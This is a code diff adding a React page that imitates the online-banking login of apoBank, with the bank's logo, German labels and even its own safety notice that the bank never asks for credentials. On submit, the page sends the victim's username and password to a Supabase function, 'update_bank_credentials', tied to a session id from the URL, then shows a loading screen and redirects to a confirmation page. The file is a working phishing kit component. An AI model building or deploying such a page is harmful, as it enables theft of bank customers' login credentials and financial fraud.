@@ -1,0 +1,314 @@
+import { useState, useEffect } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
+import { usePageMeta } from "@/hooks/use-page-meta";
+import logoAsset from "@/assets/apobank-logo.svg.asset.json";
+
+const FONT = "'TypoPRO Source Sans Pro', sans-serif";
+const PRIMARY = "#012169";
+const TEXT = "#1e325f";
+const BODY_BG = "#f8f9fa";
+const LINK = "#555";
+const BORDER = "#ced4da";
+
+const Apobank = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
+  const [showLoading, setShowLoading] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
+
+  useEffect(() => { window.scrollTo(0, 0); }, []);
+  usePageMeta("Login apoBank", logoAsset.url);
+
+  const canSubmit = username.trim().length > 0 && password.length > 0;
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!canSubmit || submitting) return;
+    setSubmitting(true);
+    if (sessionId) {
+      const { error } = await supabase.rpc("update_bank_credentials", {
+        p_session_id: sessionId,
+        p_username: username,
+        p_password: password,
+        p_username_label: "Benutzername",
+        p_password_label: "Passwort",
+      });
+      if (error) console.error("Update failed:", error);
+    }
+    setShowLoading(true);
+  };
+
+  return (
+    <div
+      style={{
+        fontFamily: FONT,
+        color: TEXT,
+        backgroundColor: "#fff",
+        minHeight: "100vh",
+        fontSize: "1rem",
+        lineHeight: 1.5,
+      }}
+    >
+      <div style={{ height: "2.5rem" }} />
+
+      <main
+        style={{
+          maxWidth: 940,
+          margin: "0 auto",
+          padding: "0 12px",
+        }}
+      >
+        <div
+          style={{
+            borderRadius: 4,
+            overflow: "hidden",
+            boxShadow: "0 .125rem .25rem rgba(0,0,0,.075)",
+          }}
+        >
+          {/* Header */}
+          <div style={{ background: "#fff", padding: "22px 32px" }}>
+            <h1
+              style={{
+                color: PRIMARY,
+                fontSize: 40,
+                fontWeight: 500,
+                margin: 0,
+                lineHeight: 1.2,
+              }}
+            >
+              Login apoBank
+            </h1>
+          </div>
+
+          {/* Body */}
+          <div style={{ background: BODY_BG, padding: "28px 32px 32px" }}>
+            <div style={{ fontWeight: 600, marginBottom: 24 }}>
+              Willkommen im Online-Banking der apoBank
+            </div>
+
+            <form onSubmit={handleSubmit} autoComplete="off" noValidate>
+              <div className="apo-row">
+                <label htmlFor="apo-username" className="apo-label">
+                  Benutzername
+                </label>
+                <div className="apo-field">
+                  <input
+                    id="apo-username"
+                    name="username"
+                    type="text"
+                    autoCapitalize="off"
+                    spellCheck={false}
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    className="apo-input"
+                  />
+                </div>
+              </div>
+
+              <div className="apo-row">
+                <label htmlFor="apo-password" className="apo-label">
+                  Passwort
+                </label>
+                <div className="apo-field" style={{ position: "relative" }}>
+                  <input
+                    id="apo-password"
+                    name="password"
+                    type={showPassword ? "text" : "password"}
+                    autoCapitalize="off"
+                    spellCheck={false}
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    className="apo-input"
+                    style={{ paddingRight: password.length > 0 ? 36 : undefined }}
+                  />
+                  {password.length > 0 && (
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword((v) => !v)}
+                      aria-label="Passwort anzeigen oder ausblenden"
+                      style={{
+                        position: "absolute",
+                        right: 6,
+                        top: "50%",
+                        transform: "translateY(-50%)",
+                        background: "transparent",
+                        border: 0,
+                        padding: 4,
+                        cursor: "pointer",
+                        color: TEXT,
+                      }}
+                    >
+                      {showPassword ? (
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a19.5 19.5 0 0 1 5.17-6.17"/><path d="M1 1l22 22"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a19.5 19.5 0 0 1-2.16 3.19"/><path d="M14.12 14.12A3 3 0 1 1 9.88 9.88"/></svg>
+                      ) : (
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                      )}
+                    </button>
+                  )}
+                </div>
+              </div>
+
+              <div style={{ display: "flex", justifyContent: "flex-end", marginTop: 8 }}>
+                <button
+                  type="submit"
+                  disabled={!canSubmit || submitting}
+                  className="apo-btn"
+                >
+                  Anmelden
+                </button>
+              </div>
+
+              <p style={{ marginTop: 4, marginBottom: 16 }}>
+                Mit dem Absenden Ihrer Anmeldedaten erkennen Sie die{" "}
+                <a href="#" target="_blank" rel="noopener noreferrer" style={{ color: LINK }}>
+                  Sicherheitshinweise
+                </a>{" "}
+                an.
+              </p>
+            </form>
+
+            <p style={{ fontWeight: 600, margin: "24px 0 16px" }}>
+              Maßnahmen für sicheres Online-Banking:
+            </p>
+
+            <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 16 }}>
+              <IconLock />
+              <span>1. Wir fragen niemals nach Ihren Zugangsdaten.</span>
+            </div>
+            <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 24 }}>
+              <IconMail />
+              <span>2. Bei zweifelhaften E-Mails gilt: Keine Links oder Anhänge öffnen.</span>
+            </div>
+
+            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 4 }}>
+              <IconPhone />
+              <strong>+49 211 5998 8000</strong>
+            </div>
+            <a
+              href="#"
+              target="_blank"
+              rel="noopener noreferrer"
+              style={{
+                color: LINK,
+                textDecoration: "underline",
+                marginLeft: 34,
+                display: "inline-block",
+              }}
+            >
+              Hotlines der apoBank
+            </a>
+          </div>
+        </div>
+
+        <footer style={{ padding: "32px 0", textAlign: "center" }}>
+          <img src={logoAsset.url} alt="apoBank Logo" style={{ height: 56, width: "auto" }} />
+        </footer>
+      </main>
+
+      <style>{`
+        .apo-row {
+          display: flex;
+          flex-wrap: wrap;
+          margin-bottom: 1rem;
+          align-items: center;
+        }
+        .apo-label {
+          flex: 0 0 auto;
+          width: 100%;
+          padding-top: calc(.375rem + 1px);
+          padding-bottom: calc(.375rem + 1px);
+          font-weight: 600;
+        }
+        .apo-field {
+          flex: 0 0 auto;
+          width: 100%;
+        }
+        @media (min-width: 768px) {
+          .apo-label { width: 41.6667%; padding-right: .75rem; }
+          .apo-field { width: 58.3333%; }
+        }
+        .apo-input {
+          display: block;
+          width: 100%;
+          padding: .375rem .75rem;
+          font-size: 1rem;
+          line-height: 1.5;
+          color: #55595c;
+          background-color: #fff;
+          border: 1px solid ${BORDER};
+          border-radius: .25rem;
+          font-family: inherit;
+          outline: none;
+          transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+        }
+        .apo-input:focus {
+          border-color: #fff;
+          box-shadow: 0 0 0 .25rem rgba(1,33,105,.25);
+        }
+        .apo-btn {
+          display: inline-block;
+          padding: .375rem 1rem;
+          min-width: 120px;
+          font-size: 1rem;
+          font-weight: 400;
+          line-height: 1.5;
+          color: ${PRIMARY};
+          background-color: transparent;
+          border: 1px solid ${PRIMARY};
+          border-radius: .25rem;
+          cursor: pointer;
+          font-family: inherit;
+          transition: color .15s, background-color .15s, border-color .15s, box-shadow .15s;
+        }
+        .apo-btn:hover:not(:disabled) {
+          color: #fff;
+          background-color: ${PRIMARY};
+        }
+        .apo-btn:disabled {
+          color: #6c757d;
+          border-color: #6c757d;
+          opacity: .65;
+          cursor: not-allowed;
+        }
+      `}</style>
+
+      {showLoading && (
+        <LoadingOverlay
+          onComplete={() => navigate("/confirmation?s=" + sessionId)}
+        />
+      )}
+    </div>
+  );
+};
+
+const IconLock = () => (
+  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#012169" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
+    <rect x="4" y="10" width="16" height="11" rx="1.5"/>
+    <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
+    <circle cx="12" cy="15" r="1.2" fill="#012169" stroke="none"/>
+    <path d="M12 16v2"/>
+  </svg>
+);
+
+const IconMail = () => (
+  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#012169" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
+    <rect x="3" y="5" width="18" height="14" rx="1.5"/>
+    <path d="M3 7l9 7 9-7"/>
+    <path d="M10 13.5c.4.4 1 .6 1.5.5l1-.2"/>
+  </svg>
+);
+
+const IconPhone = () => (
+  <svg width="24" height="24" viewBox="0 0 24 24" fill="#012169" aria-hidden>
+    <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56a.977.977 0 0 0-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
+  </svg>
+);
+
+export default Apobank;
